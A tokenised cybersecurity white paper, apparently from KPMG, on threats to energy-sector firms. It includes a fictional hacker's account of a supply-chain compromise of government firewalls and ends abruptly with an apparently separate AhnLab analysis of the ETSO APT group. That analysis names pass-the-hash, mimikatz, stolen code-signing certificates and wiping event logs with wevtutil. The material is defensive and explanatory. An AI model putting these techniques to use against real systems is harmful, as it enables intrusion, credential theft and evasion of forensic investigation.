Let us first take a peek into an attacker 's world .
Understanding the perspective of an attacker is essential for everyone involved in fighting cybercrime .
For that reason , staff in KPMG Netherlands interviewed one of their professionals – an ' ethical hacker ' .
He relayed us an intriguing fictitious story .
It is up to you to judge how realistic this threat would be to your organisation .
`` My employer insists on remaining anonymous , but rest assured , he is quite resourceful .
He approached me a few weeks ago with a job offer .
The goal he set was quite ambitious : steal as many secrets from the government as you can .
Let me tell you about the steps I took .
First , I sat down to think about what I knew about the government 's IT infrastructure .
At a conference last fall , I had met an IT director of a ministry who had told me that all firewalls for the government were supplied by the same vendor , company Y. Hacking such a firewall was a formidable task - not something I was ready to take on directly .
Instead , I took a more indirect approach .
I logged in to LinkedIn and searched for employees of software development companies who mentioned company Y as one of their clients on their LinkedIn profile .
Many professionals mention prestigious client names in their profile , even when company policy prohibits name dropping .
Shortly after , I found multiple software vendors which make niche software and listed company Y as a client .
I visited the vendors ' websites and scanned their externally reachable IP addresses until I found one which had an unpatched vulnerability in their web server : company X .
After a day 's work , I was inside their network .
Company X is a small organisation and they do not feel they need network segmentation , so I was able to reach all machines on their internal network through that web server .
After some more work , I was able to elevate my privileges to domain administrator , which meant I had full access to all of their systems .
This was where I hit a bump .
I intended to change the source code of their product in such a way that it would allow me to connect remotely to the system of anyone who installed it , but I had never done that before .
I then decided to log on to a hacker forum and posted a request for help .
I offered 10,000 euros reward for a job well done .
After a while , I was approached by someone who was willing to help me .
I asked around to confirm his reputation in this field .
I enlisted his help in modifying the source code of the main product of company X .
The security policies of company Y were very strict : only the system administrators can install software on the workstations , and both incoming and outgoing traffic goes through a proxy server .
Luckily , the virus which my associate hacker had written communicates through DNS , which was not actively monitored or filtered .
The software from company X was updated on a regular basis , and after three weeks I received a message which indicated that I had access to their workstations .
I called on my associate hacker once more , but this time for a more advanced task : reprogramming the firmware of the firewalls which company Y produces .
He indicated that he needed the help of a contact who installed a backdoor in all firewalls for another 20,000 euros .
Now , all I needed to do was wait for the next update of the firmware .
I posted some fake security vulnerabilities for the current version of this firmware , to ensure that the firmware would be upgraded timely .
And slowly but surely , I gained access to all internal networks of the government .
I could then route any traffic which flows through any government network through my own computer .
I can also read all emails which are sent between government employees internally .
I can find vulnerable servers by scanning the networks .
In almost all the internal networks , I have found at least one server which I can exploit .
I installed backdoors on hundreds of workstations which allows me the ability to monitor email servers , so emails with interesting attachments can be forwarded to me .
Additionally , I have obtained login credentials for almost all major government databases .
Every day , almost two hundred gigabytes of government secrets are sent to me automatically .
This amount is only limited by the amount of bandwidth I can get , and the number of hard disk drives I install .
I ' m being paid 100 euros per gigabyte of information .
I will leave it to you to calculate my hourly wage .
'' The sad truth is that cybercrime is here to stay .
A report by the Government Accountability Office indicated that 24 key government agencies in the United States have logged a 650 percent increase in cyber security incidents in 2011 compared to five years ago .
According to a survey by KPMG Netherlands , 49 percent of organisations have experienced some form of cybercrime activity during the past 12 months while the remaining may not even have proper detection measures in place .
Among the 49 percent , 10 percent indicated that they have been attacked more than 100 times within the past year .
The remaining respondents said they were attacked successfully up to five times last year .
Most of the incidents were not covered by the media and are therefore not publicly known .
Information leakage most common Globally , information leakage is one of the most common challenges faced by organisations .
Opening an email containing a virus from a hacker can allow perpetrators to seize control of your computer , read your emails and record your passwords .
Information leakage is in fact one of the most common types of incidents across the world and can easily take place in your daily life .
Take for example that you have made a donation to a local charity .
In recognition of your contribution , the organisation lists your name on their website as a sponsor .
Two days later , you receive an email from the Fundraising Chair asking you to confirm your donation .
You open the email , fill out the form ( you are also careful not to include any banking or sensitive information ) and return it to the sender .
But in reality , the email did n't come from the charity at all ; the attachment was , in fact , a high quality fake containing a virus , allowing perpetrators to seize control of your computer , read your emails and record your passwords .
Everything you know or see is now visible to the perpetuators .
Clearly , information leakage is rapidly becoming a board - level risk .
A 2012 survey by KPMG suggest that more than three - quarters of the Forbes 2000 companies leak potentially dangerous data ( See Figure 1 below ) .
Personal information and financial data are often lost due to hacking , system failure , human negligence and disgruntled employees .
Some countries have already enacted legislation to curb such problems .
The European Commission 's General Data Protection Regulation released in 2012 states that companies have the obligation to protect their network and personal information .
Companies must also authorities within 24 hours after a serious breach , or face a penalty of up to one million Euros or two percent of turnover .
It is worth noting that hacktivist groups are often the agents responsible for information leakage .
For instance , members of `` Anonymous '' , a famous hacktivist group , are not only known for bringing down commercial systems and websites , they have also infiltrated into commercial organisations ' computer systems , exposing correspondence and personal data to the public in the process .
In 2010 , Anonymous penetrated Sony 's network and cost the latter US $ 170 million dollars in reparation for the unauthorised disclosure of customers ' names and credit card numbers .
Another Anonymous ' affiliate group AntiSec dumped over 860,000 user credentials including 75,000 sets of personal and financial information into the open Internet after breaking into the firm Stratfor 's systems .
During the past few years , industries all around the globe have witnessed for the first time carefully engineered and profoundly complex attacks such as Stuxnet , Night Dragon and Shamoon ( these will be described later in the document ) .
Cyber security has become a grim issue that no one can avoid .
Of all the potential marks at crosshair , the ENR industry is one of the most attractive targets for cyber criminals .
According to the United States ( US ) Department of Homeland Security News Wire published in April 2012 , American water and energy companies deal with a constant barrage of cyber attacks on a daily basis .
These incidents usually take the form of cyber espionage or denial - of - service ( DoS ) attacks against the utilities ' industrial - control systems .
According to a survey report released by The Centre for Strategic and International Studies in 2010 , `` critical infrastructure firms such as power grids , industrial control networks and oil refineries are facing staggering level of cyber attacks , and are not adequately prepared to defend themselves '' .
In April 2012 , the US Cyber Security response team warned of attacks upon the gas industry .
The Industrial Control Systems Cyber Emergency Response Team ( ICS - CERT ) reported a number of cyber intrusions targeting gas pipeline companies .
Analysis of the attacks confirmed they are part of an ongoing campaign dating back to December 2011 and indicated Spear Phishing was used to target a number of specific individuals across the gas pipeline industry .
Spear phishing is an e - mail spoofing fraud attempt that targets a specific organisation , seeking unauthorised access to confidential data .
On 15 August 2012 , Saudi Aramco , a large national oil and gas company with global operations , announced that they had to disconnect their IT systems from the Internet while dealing with a serious disruption of their network .
The disruption , which continued for two weeks , was the result of a cyber attack that used a computer virus to disable over 30,000 of the company 's workstations .
The virus , later named as `` Shamoon '' , was the first significant cyber attack on a commercial target to cause real damage .
It is also the most destructive attack the private sector has experienced to date .
Later in the same month Rasgas , a main player in the Qatari Liquid and Natural Gas scene , was also hit by the Shamoon ( as per security experts ) virus and consequently forced to bring their entire network offline .
Another series of cyber incidents in the ENR sector were dubbed collectively by security company McAfee as `` Night Dragon '' .
McAfee believes that these attacks on global oil , energy and petrochemical companies may have started as early as in 2007 .
Evidence from McAfee has shown that this series of well - coordinated and specifically focused attacks involve a myriad of different techniques and methods .
The primary target seems to be any financial information related to bids and oil - and - gas operations .
McAfee also pointed out that all the attacks took place regularly during weekdays from 9 am to 5 pm in GMT + 8 time zone , which matched with the source location as determined by the IP address , thus pointing at the high possibility of `` company men '' being hired to perform the job systematically .
There are many more cyber security incidents which have taken place in the ENR industry .
In 2011 , a Canadian - based company which supplies remote administration and monitoring tools to Fortune 100 energy companies reported that it had suffered a security breach .
Upon breaching the corporate network , the attackers installed malicious software on computers and stole information related to a remote administration tool which the company supplies .
Another incident of more recent times occurred in early 2013 .
In February 2013 , the US Department of Energy confirmed that computers and servers at its Washington headquarters were compromised in the previous month .
In this attack , personally identifiable information of several hundred employees and contractors may have been compromised .
Seemingly non - critical at first glance , this information may however be used to further future attacks into having serious consequences .
In another case , unidentified hackers helped a manufacturer in China obtain the breakthrough design of a wind turbine by an energy company in the United Kingdom .
The Chinese manufacturer subsequently made and sold the product at a much lower price , driving the original company in the UK into closure .
DoS attacks represent yet another form of cyber security attacks which cause huge financial losses and massive damage to companies in the ENR sector .
A report published by McAfee in 2011 stated that four out of every five oil , gas and power companies have suffered at least one DoS attack in 2011 .
Cyber attacks are also increasingly escalating into cyber warfare .
In an October 2012 Wall Street Journal article , U.S. officials noted that `` Iranian hackers with government ties have mounted cyber attacks in 2012 against American targets , escalating a low - grade cyber war ...
The Iranian effort culminated in a series of attacks against U.S. banks as well as electronic assaults on energy companies in the Persian Gulf .
'' These incidents clearly show the increasing severity of cyber attacks and give an idea on how important cyber security will be in the future .
The obvious question to ask is why these various organisations are so vulnerable in the face of cyber attackers .
In 2012 , Carnegie Mellon University conducted their yearly survey for largest American companies .
The results indicated that more than 70 percent of C - Suite executives and members of the board are not actively involved in the protection of their company data .
They are also rarely involved in the inspection of key employees working on information security or the revision of corporate - wide policies in this aspect .
A similar trend has been observed by the Government Accountability Office in American government agencies .
Despite receiving numerous security recommendations each year , companies were not implementing these properly .
Key personnel were also not being trained adequately .
In addition , there is a lack of proper monitoring on security controls or appropriate key performance indicators to assess improvement .
The ENR sector is critical as it powers the growth of almost every economy in the world .
The sector can be broadly divided into three categories : electricity , petroleum and natural gas .
In the electricity category , both automation systems and utilities controls of electricity infrastructure are built on a complicated system known as the Supervisory Control and Data Acquisition ( SCADA ) .
Similarly , the production and distribution of petroleum and natural gas are heavily dependent on systems similar to SCADA .
Unfortunately , such industrial infrastructure control systems have been facing a severe legacy problem in recent years .
They have been rashly connected to the Internet for remote accessibility without implementing adequate security measures .
This has in turn led to higher chances of such systems falling prey to cyber attacks .
In this era of information and connectivity , malicious hackers are able to easily find information assets as targets in a corporate network .
What is at stake is financially valuable data such as mergers - and - acquisitions plans , transaction records , quarterly / annual reports and internet banking details .
Strategic information including intellectual property , contact details of senior executives , records of legal disputes and various trade secrets are also at risk .
In addition , personal data like employees ' addresses and date of birth , once compromised might very well be used in facilitating identity theft .
Last but not least , process control networks are being increasingly favoured by attackers given their vast potential in bringing about significant impact , as proven in the famous Stuxnet case and other incidents described earlier .
Given how the numerous production and exploration activities carried out by energy companies are dependent on these networks , this trend is of particular relevance and importance to the ENR sector .
A 2011 report by KPMG has shown that oil and gas operations are amongst the top 10 sectors which suffer from the most information leakages worldwide .
Information leakages involving oil and gas operations account for six percent of all security incidents .
Some of the sources of leakage are within the direct control of the corporation and can be prevented if companies put in the effort .
These sources include websites , documents and web servers .
However , there are also other channels such as popular search engines and forums which are outside of the usual enterprise security curtain and pose a much more complex challenge .
The KPMG report also revealed that 78 percent of Forbes 2000 corporate websites leak some form of potentially useful information through their document meta - data .
Document meta - data is information ' about ' a document , or information on its properties .
It often informs who created a document , when and where on a device or network .
According to version information retrieved from document meta - data , 71 percent of the 2000 companies may be using potentially vulnerable and out - dated versions of Microsoft and Adobe software .
Furthermore , 16 percent of corporate web servers may be vulnerable to attack due to missing security patches or out - dated server software .
Many instances of un - patched and unsupported web server software were found to be serving Forbes 2000 corporate websites .
Part of KPMG 's research focused on the structure of the Forbes 2000 corporate websites to identify any potentially sensitive file locations or hidden functionality that may be useful to cyber attackers .
A number of file locations marked ' private ' were also identified , hosting documents that were not intended for public consumption ( See Figure 2 below ) .
The direct result is that out of all the servers used for corporate websites , 15 percent offer hacker access to test functionality and private login portals that potentially allow file upload capabilities that could likely lead to full take - over of servers by cyber attackers .
Oil & Gas operations have also emerged in the list of top 10 sectors that post most information to public forums and newsgroups .
There are as many as 88,681 of such postings in newsgroup alone , according to the report .
If past experience has taught us anything , it is that cyber attackers and organised crime do not target one avenue of attack .
Instead , they use a combination of available information leaks to profile a target , and map out the target 's internal systems and their components .
It is important to emphasise that the processes used to gather the information leaks mentioned above are not sophisticated and available to anyone with access to the Internet and little more than a web browser .
The problem is even worse when it comes to control systems which are widely adopted by ENR industries , as explained by chief cyber security strategist from Computer Sciences Corporation ( CSC ) , Donald Purdy .
Purdy , formerly a cyber official at the Department of Homeland Security , mentioned during a major security conference in San Francisco in 2012 : '' These are older systems so they are harder to control .
And for convenience and cost savings , people have connected them to the internet in order to control them from remote locations .
So this is almost a perfect storm in terms of vulnerability because the nation is so dependent on these systems … This is a significant security issue for the United States and frankly for the world .
'' In the monthly monitor report released last September by the US Industrial Control Systems Cyber Emergency Response Team ( ICS - CERT ) , it was also mentioned that `` the positive aspects of better connectivity were overshadowed by the introduction of significant vulnerabilities '' .
For instance , Justin W. Clarke , a 30-year - old cyber security researcher and electric utility expert discovered two major vulnerabilities in 2012 on Siemens ' RuggedCom equipment which is extensively used by companies in communicating with power stations situated in different locations .
The first vulnerability is essentially a secr `` back door '' which would easily allow hackers remote access into the equipment .
The second vulnerability makes it possible for hackers to intercept the network traffic between operator and devices which may contain authentication credentials .
Potential attackers could take advantage of such flaws to manipulate power stations or use these flaws to launch another set of attacks on a much larger scale .
The situation is made even worse when independent researchers release and circulate system flaws and vulnerabilities for reference and countermeasure studies .
While the intention behind such documents might be good , the direct consequence is that many could now easily gain access to dangerous and powerful `` weapons '' such as the code of Stuxnet , which can cause immense damage to critical infrastructures .
In contrast to the published vulnerabilities , certain manufacturers of critical system controllers are reacting way too slowly which have resulted in research groups like Digital Bond , releasing exploits for these vulnerabilities in order to `` stimulate '' the patching and upgrading efficiency .
When it comes to electrical power , technology is also a double - edged sword .
While advances in smart grid technologies have helped better detect power theft and reduce power loss with smart meters been recently deployed in countries such as in Serbia and Brazil , these technologies also give rise to possibilities of their advanced functionalities being used for shady purposes .
For instance , two demonstrations at Security B - Sides and Black Hat conferences illustrated that hackers could basically tweak the smart metres currently in use to perform functionalities as they wish , which include changing of temperature , controlling of lighting and even cutting of power during emergencies .
As a side note on corporate security policies and procedures , the Saudi Aramco incident where large number of business computers were disabled , also highlighted importance of monitoring network attacks initiated by inside personnel and the potential danger of using portable storage media like thumb drives .
Over the years , two major shifts in trends have been observed in terms of cyber attacks .
Firstly , the targets are shifting from individual organisations to chains of related companies .
Secondly , the main components of attackers have shifted from script kiddies to criminal groups , with the latter being much more specialised and coordinated .
Some of the major players include : • organised cyber criminals who are most known for mass stealing of personal identities and financial data , • state or corporate sponsored espionage like the Night Dragon operation which aims to steal critical intellectual and business information , • hacktivists such as Wikileaks , Anonymous and LulzSec who have amassed a large number of supporters and participants , • malicious inside personnel , as in the case of Bradley Edward Manning , a United States Army soldier who was arrested in May 2010 in Iraq on suspicion of having passed classified material to the website WikiLeaks .
Just as attacks have evolved , companies too must evolve by re - evaluating their own ability to detect , defend and respond to cyber attacks .
Cyber incidents can be loosely divided into three categories .
The first category is accidental events due to human error , system failure or unanticipated accidents .
The second category refers to unauthorised access into networks and systems by hackers or employees .
The third category does not require actual access as it usually causes denial of service or loss of data .
Attack methods could involve complicated and coordinated efforts to beat the cyber security protection mechanism and intelligence reconnaissance , followed by social engineering techniques for acquiring of target information .
There are six most common types of security failings .
These are shared accounts , weak passwords , lack of effective network monitoring , lack of effective Web monitoring , absence of logging and absence of log analysis .
Lack of user awareness also provides more opportunities for social engineering attempts to succeed .
Examples of such attempts include luring Internet users into execution of malware and Spear Phishing .
( See Figure 3 below ) .
A group of attackers who are particularly good at social engineering is Anonymous .
These hackers typically exploit easy - to - guess passwords of users or use emails to trick users into revealing confidential information or into clicking links which lead to the download of malicious software .
However , Anonymous is not the only group of people who are familiar with this technique .
In fact , cyber criminals and state - sponsored attackers have been practising it for a far longer time .
The stakes are also bigger for them as they stand to gain a whole lot more of important information .
Eddie Schwartz , chief security officer of the security firm RSA summed it up best during a security conference in San Francisco in 2012 when he said : `` The attacks by them ( Anonymous ) pale in comparison to the nation - state stuff and the criminal element … The more eyes , the greater chance of success ( for an attack ) '' , which accurately depicts thecyber environment nowadays .
Source : 2012 KPMG paper `` A nuanced perspective on cybercrime '' .
The objectives of cyber attacks can be divided into two distinct categories .
These are • misappropriation and theft of intellectual property , financial data or other confidential information for monetary gain or to gain a competitive edge ; • corruption or disturbance of key business assets and processes for strategic purposes or to make an activism statement , However , the actual impact on victim companies could be much broader and more profound .
More specifically , direct consequences of such attacks comprise disruption of business and production processes , unauthorised access to monetary operation , loss of intellectual property , disclosure of merger - and - acquisition deals , identity theft and compromising of customer data .
Such attacks can also adversely affect third party partners in the industrial chain .
( See Figure 4 below ) .
But all the above consequences are just the tip of the iceberg .
Deeper financial and reputational impact further includes loss of competitive advantage in accessing new fields , failure to keep current clients and investors , losing deals and disputes ( or winning them on unfavourable terms ) , regulatory fines , liability lawsuits , share price drops , costs involved in fixing business relationships and even negative international publicity .
In addition , the company would very likely be forced to spend more than usual to fix systems and repair damages .
It is also very likely that costly fees will be incurred from services of third party experts and consultants for mitigation and recovery services .
There could also be forced expenditure on personnel change , organisational restructuring and additional training .
Source : 2012 KPMG paper `` A nuanced perspective on cybercrime '' .
However , effective awareness requires continuous effort to remain vigilant .
In this aspect the financial institutions seem to be doing a better job in understanding the potential `` enemy '' compared to the other industries , including the ENR sector .
The Obama administration submitted a cyber security proposal to Congress last May to outline its priorities for cyber security and to press lawmakers to pass comprehensive legislation to protect critical U.S. infrastructure that powers the Internet , utilities , and other control systems that are vulnerable to attack .
Feds Simulate Crippling Cyber security Attack On NYC Electricity [ March 2012 ] Advances in technology and mounting concern about the potential for a cyber attack to damage power stations , water - treatment plants and other critical systems have prompted senior officials to seek a more robust role for the department 's Cyber Command .
For one thing , cyber attacks can take place in milliseconds .
The assailant may be unknown .
The attack route may be hard to trace , crossing multiple countries .
Pentagon proposes more robust role for its cyber - specialists [ August 2012 ] Iran is to move key ministries and state bodies off the worldwide internet next month in an effort to shield them behind a secure computer wall from disruptive cyber attacks like the Stuxnet and Flame viruses .
`` The establishment of the national intelligence network will create a situation where the precious intelligence of the country wo n't be accessible to these powers .
'' Iran to unplug from Web to escape ' Internet monopoly ' [ August 2012 ] The key is to be able to understand the motives behind a cyber attack .
It must be made clear the cyber world is no longer playing in the `` minor league '' , but rather the `` major league '' with players who potentially have access to unlimited resources and endless patience in achieving an aforementioned objective .
On a second note it is extremely necessary to conduct thorough analysis of risks and have a clear understanding of the different asset value perception .
What seems of little value to one firm might be worth a lot more to attackers who have a totally different perspective or who are planning an attack on a chain of companies .
As a result , consideration should be given to the relationship between the costs for implementing detective controls and costs of incidents .
The latter should include indirect damages incurred on consumer confidence and reputation , the two most valuable assets of a company .
A 2012 survey titled `` A nuanced perspective on cybercrime '' which was conducted by KPMG in Netherlands , stated that out of the 170 responding organisations under various sectors including ENR , approximately 19 percent of them spend more than 1.5 million euros on cybercrime prevention , detection and response per year .
Thirdly , whether short term measures or long term controls have been implemented , the upper management of companies should never be complacent and believe that they enjoy 100 percent security .
The IT landscape in many modern organisations is simply often too complex for complete protection .
The same 2012 KPMG survey also revealed that 45 percent of companies experienced attempts of cybercrime attacks in 2011 .
In addition , 55 percent of respondents were unsure of whether they can effectively respond to a cybercrime attack , and only 20 percent said they can respond effectively to an attack but unfortunately do not have an attack response plan in place .
Among all the responding corporates , approximately 30 percent have forensic capabilities as a control and only 55 percent have central incident and event monitoring capabilities .
Most importantly , it is vital for the management to set the correct tone .
KPMG 's experience with clients has shown over and over again that security is largely a management issue .
The survey also showed that more than 75 percent of respondents believe that fighting cybercrime goes beyond installing the needed technology to curb it .
Some 90 percent of them also agree that cybercrime should be discussed at the board level .
Most respondents from the ENR sector of the same KPMG survey do not think so .
They believe that hackers are more likely to win in this sector compared to other industries .
If a company does not consider itself to be ready , actions must be taken .
Management should endorse prevention efforts and start seeking a structured approach .
There also has to be effective use of security monitoring and seamless cooperation between the different parties involved so that knowledge and expertise can be shared among government , business communities , IT security groups and even cross - border organisations .
Beyond the prevention of incidents , timely detection and an adequate response are also critical .
If there is any major gap or deficiency in the policies , procedures and tools of a company , the worst time to discover these would be when a cyber security incident is already set on its course .
In terms of short - term actions , the company could perform risk analysis from the perspective of an attacker , identify and monitor critical assets as well as begin implementing a standby incident response team .
In the long run , companies should strive for cost - effective control of the cyber environment by addressing the domains of people , processes and technology .
Yet , even the most comprehensive security control system can not guarantee the complete prevention of cyber incidents .
An incident response plan and an emergency action plan is therefore also of paramount value in the proper handling of a security compromise and reducing the subsequent damage .
If a thorough and detailed plan is not available , the very least an organisation should do is to be familiar with some basic concepts and simple primary actions to respond to an incident .
( See Figure 5 below ) .
This helps the company achieve more effective business resilience , which is important especially for the protection of the most critical assets .
The fundamentals of cybersecurity are probably best summed up by Ron Ross , National Institute of Standards and Technology ( NIST ) Senior Fellow , who said during a launch of NIST 's latest guidance on security controls : `` The fundamentals of cyber security … I call it the physics of security … do n't change over time … how we apply those controls ...
is a little bit different , but the same fundamentals .
'' Given the shifting perspective of the defence against cybercrime , a more modern approach to cyber security therefore also focuses on the perspective of the criminals .
In terms of risk assessment , the organisation must not only consider itself as an attractive end target , but also consider its part in the supply chain .
It should also not view itself as one entity that should be protected , but as a collection of processes , users and IT infrastructure .
Companies should focus on being well informed of ( the character ) of possible threats and invest in a proper defence .
They should not do this in an isolated way , but rather use the knowledge and experience of colleagues in both the public and private sector .
A joint response is essential for protection against cyber espionage , terrorism , crime and disruption of information and communication systems .
With respect to the industrial control system , ICS - CERT suggests a proactive security model as depicted in the Figure 6 below .
This model can be further complemented with a more detailed five - step approach in protecting information and records : • Obtain executive sponsorship , establish a team , and determine the team 's goal , objectives , and milestones - ensuring that these efforts are aligned with the goals of the business .
• Develop a training and awareness campaign .
Policy content should be comprehensive , consistent and implemented with process changes and the introduction of appropriate controls and metrics to measure effectiveness and compliance .
• Assess the current state of the organisation 's information protection efforts .
Classifying the sensitivity of information should be a key goal .
• Design the desired state of information integrity protection , with the goal of establishing improved handling and protection practices that achieve policy requirements , lower business risk , and increase productivity .
• Implement the desired state .
Enhanced process and data workflows , controls , and processes are a key outcome .
The result is a programme that helps leaders ensure the risk - based protection of information assets .
There have been quite a few cases worldwide where KPMG applied the use of frameworks and helped different clients with their needs in achieving the goal of cyber security .
In the Dutch market , joint efforts of the financial sector are pretty successful in boosting awareness .
Aside from cooperation between financial institutions and the Government , KPMG also actively shares experiences as part of the focused joint efforts .
Generally , there are three types of security controls : prevention , detection and response .
KPMG in the Netherlands provides the banks with an update on the trends in cybercrime threats and potential solutions twice a year .
KPMG employs a global network of hundreds of information security specialists , which reaches virtually all major financial institutions worldwide .
Attack patterns observed at other banks and solutions applied by these institutions help to shape an image of upcoming attacks and solutions relevant for Company B .
Knowledge of the latest cybercrime attack trends and defence measures helps Company B to update the bank 's defences on time in order to adequately respond to attacks .
In general , preventive controls are more popular than detective controls whereas detective controls are used more often than responsive controls , as in this case of how KPMG helped a company in the ENR industry .
However , as discussed earlier , incidents can not be avoided 100 percent of the time .
This implies that detection and response are equally important and are thus the areas with the biggest room for improvement .
Company Z is a well - known company in the oil , gas and natural resources industry .
KPMG firms ' teamed with a technology partner provider to supervise one of the largest global implementations of a security monitoring platform .
The platform correlates information about thousands of security events from numerous systems spanning across the globe .
A list of the most relevant cybercrime risks for Company Z was drafted in close cooperation with the organisation .
For each risk , a set of detection rules was defined .
The ability to adequately respond is mainly achieved by properly established processes and governance .
KPMG advised on governance structure , engineered new incident response processes and established training programmes for security personnel .
Below is another example illustrating KPMG 's experience in adequate and systematic response after a security incident has taken place : Company A was informed by a whistleblower that an attacker gained access to the company 's website and/or closed environment .
In response to this news the website was taken offline and KPMG was asked to assist .
• A collaboration of Forensic technology and IT security experts captured forensically sound images of the most critical servers to make sure no traces or evidence were lost .
• The images were analysed for traces in system files and properties , logs from firewalls were secured and analysed , KPMG also analysed all traffic to and from the compromised servers .
• The analysis showed that the perpetrator succeeded in creating and uploading several files to the web server that contained malicious code , allowing the perpetrator to send commands to the server from a remote location .
• KPMG helped the client by implementing remedial procedures and additional security measures , thus mitigating the risk of further damage and bad publicity .
Even if it is within an organisation itself , one way of improving the handling of specific cyber incidents related to industrial control systems would be to gather a group of staff to conduct brainstorming and collaboration exercises During such sessions , staff from various departments will get to receive more adequate cyber security training , initiate effective inter - departmental interactions , and update antiquated policies and procedures .
They can also get to identify and fix any security flaws found in the system , so as to create a corporate and organisational environment that is more resistant to cyber attacks .
The battle against cyber crime is one which is difficult to win .
From the perspective of the Asia Pacific region , we understand that data security is not an easy concept for most business leaders to fully grasp .
In part , this is because many organisations do not have a clear view on the actual value of their data and as a result , tend to follow a one - size - fits - all approach to data security .
At the same time , organisations in this region have also seen a gradual migration of their corporate value away from physical assets ( such as facilities , products and people ) towards digital assets ( such as bid information , technology designs or customer data ) .
Therefore , most businesses have robust crisis plans for events like floods , fires or sudden executive departures , but have very few for digital security issues .
An organisation in the ENR industry must stay as up - to - date as possible with security issues and set in place effective security measures .
Beyond doing so , an ENR organisation must evaluate itself through the eyes of potential attackers so as to identify and protect parts which represent the highest substantial value .
The importance of executive leadership and support in developing a data security strategy can not be overstated .
The risk of data loss should be a board - level issue and not a challenge isolated to the IT department and risk managers .
This means that executives must not only ' walk the walk ' when it comes to complying with protocols , but also actively participate in the development of security to ensure that the rules reflect the priorities of the business .
Most importantly , executives must strive to institutionalise continuous improvement mechanisms to ensure that they learn from hard - earned lessons of the past .
Should a cyber security transformation be undertaken , the five recommended objectives would be to Prevent , to Prepare , to Protect , to Remediate and to Integrate and Transform .
However , given the scope and complexity of the challenge , it is not surprising that most executives are left wondering how best to approach the issue without dampening productivity or expending scarce resources .
It is important that executives in the Asia Pacific region balance a cautious approach to IT security with the downside and damage that can be caused by the lack of being able to carry on business as normal and the loss of confidential and sensitive information .
The ETSO APT Attack Analysis is based on analysis conducted by A - FIRST , the AhnLab digital forensic team .
This report provides a detailed nature of Advanced Persistent Threats which were led by `` ETSO Hacking Group '' ( referred to as ETSO , ETSO Attack or ETSO Hacking Group hereinafter ) since 2010 .
Based on incidents at 12 companies , this report shows how the ETSO APT attacks progressed , which methods were used at each stage of the attacks and the results of the ETSO malware analysis .
AhnLab named the malicious code , which has targeted a specific industry , as `` ETSO '' since March 3 , 2011 .
The statistics in this report are extracted from AhnLab Smart Defense , a cloud - based malware analysis system , known as ASD .
APT attacks by ETSO Attack Group began with the distribution of malware on July 18 , 2011 .
Until now , ETSO Attack Group has fiercely attacked multiple companies for various purposes such as stealing business know - how of online game companies as well as for certificates and cyber money .
ETSO Attack Group commits attacks entirely for reasons of financial profit .
In the APT attacks against the companies in Korea , the ETSO Attack Group used encrypted communication between the master which generated the malware , monitored the system and managed the C2 agent , and the agent which accessed the C2 server .
The ETSO Attack Group penetrated the targeted network via the C2 agent and remained dormant for a long period of time without any abnormal behavior that would trigger a network error or website compromise , thus making it difficult to detect the attacks .
AhnLab analyzed two malware toolkits of ETSO and confirmed they were the same or very similar to the malware `` Winnti , '' named by Kaspersky Labs and the malware toolkit `` TrendMicro Plug '' named by TrendMicro .
Considering that the ETSO Attack Group used the email accounts of the security division of the target company to distribute more malicious emails through the employee accounts and reacted in real - time to security responses and the business schedule of the target , it is assumed that there were Korean natives or multilingual persons among the attack group .
As the ETSO APT attacks have progressed , the malicious codes used in the attacks have consistently improved and become more sophisticated since 2011 .
The attacker has been very unpredictable or rather , creative , and has not left any traces .
This has made digital forensics as the only method applicable for extracting the appropriate data in unallocated areas in order to analyze and respond to the ETSO APT attacks .
The C & Cs ( Command & Control ) attacked by ETSO were mainly located in South Korea , Hong Kong , China and the US , reaching a peak of 64.30 % of all attack locations .
The C & C servers which were used to attack Korean game companies came primarily through IPs from South Korea and Taiwan .
Normally , there are specific game servers for specific countries .
When the entire IPs were blocked from a certain country , the attacker would use another country 's IPs and continue on with the attack .
South Korea was the primary victim of the ETSO APT attacks with an infection rate of 85.6 percent .
The nature of the attack was geared towards the internet game industry , of which South Korea has the most clients .
Based on the analysis of malicious codes creator known as the master and the ETSO APT malicious codes , and using the first distributer of the malicious files IPs as the standard , it has been incontrovertibly determined that the majority of the IPs came from China .
In order to penetrate a company 's internal network , the ETSO Attack Group used an external update server .
First , the group seized the update server of application program , which is most frequently used since these types of programs are not highly managed and easy to attack .
The attacker then changed the update setting file to be downloaded on to the user 's system .
Finally , the module of the application program in the user 's system reads the modified setting file and downloads to execute the malicious codes from the server which was built by the attacker .
Since this type of attack is hard to detect , the attack was much more likely to succeed bringing about a catastrophic result with a single attack since many users use the application update server .
Moreover , the attacker who seizes the update server targets a specific IP bandwidth of the company rather than randomly distributing malicious codes .
The reason why the attacker opts for the former is because random distribution that scatters malicious codes are more likely to be discovered and may be more easily detected by security products .
Once the malicious code penetrates the internal network , it will acquire various kinds of information using the user account .
The attacker obtains the ID , password , NTLM hash value from the registry and memory area and moves on laterally to another system .
The attack process is as follows : Using the user account information , the attacker creates an agreement with the network sharing system of the target system and the malicious code is then copied .
The work schedule is registered and the copied malicious code is activated .
This type of attack is called the Pass the Pass , Pass the Hash attack method .
The ETSO Attack Group used tools such as gsecdump , which was already disclosed before , WCE ( Windows Credentials Editor ) , and mimikatz ; or , alternatively , they may have used DLL ( wceaux.dll , sekurlsa.dll ) , which were inserted in the malicious code to attack the system .
Such attacks are possible because most systems within the company often use the same local administrator ID and Password for the sake of convenience .
Or within the Active Directory , it tends to use the same domain administrator account to access multiple systems , leaving the domain admin ID , password and hash value in the memory .
The ETSO Attack Group signed the malicious codes using the certificate they obtained .
The reason for stealing certificates lies in the fact that files that are not signed by a legitimate certificate will be detected by security products .
Therefore , besides attacking the updates for cyber money and personal information , the stealth quality of certificates was also one of the attack goals of the ETSO Group .
This indicates the characteristic of the attack , which shows that the multiple attacks were made by a single group .
In order to hide oneself , the attacker used more than one anti - forensic tactic .
The ETSO Attack Group copied the batch file when copying the malicious codes via network sharing , and it was this batch file that proceeded with anti - forensic techniques .
The batch file used the malicious code and cl option from the work schedule file ( .job
) , and the wevtutil option to delete the event logs ( Security , System and Application ) .
These types of anti - forensic tactics make forensic analysis difficult , hindering the effort to find the entrance of attack through back - tracing .
The ETSO Attack Group attacks for monetary reasons .
For example , the Group attacks cyber money updates and personal information .
Even if the attack is detected by security products , the attack continues on with the purpose of interfering with the service and ultimately destroying the system .
Once the DB is accessed by the attack , the malicious codes continue to be distributed , creating an overflow to keep a connection with the C & C server , even when the system admin or analyzer finds the malicious codes and deletes them .
Thus , it is very difficult to block the attack if all of the attacks are not analyzed well and dealt with all at once .
Table 4 shows the footprints of the attacker and a summary of the response .
The ETSO Attack Group is seen here to have improved its attack technique in various ways as time passes .
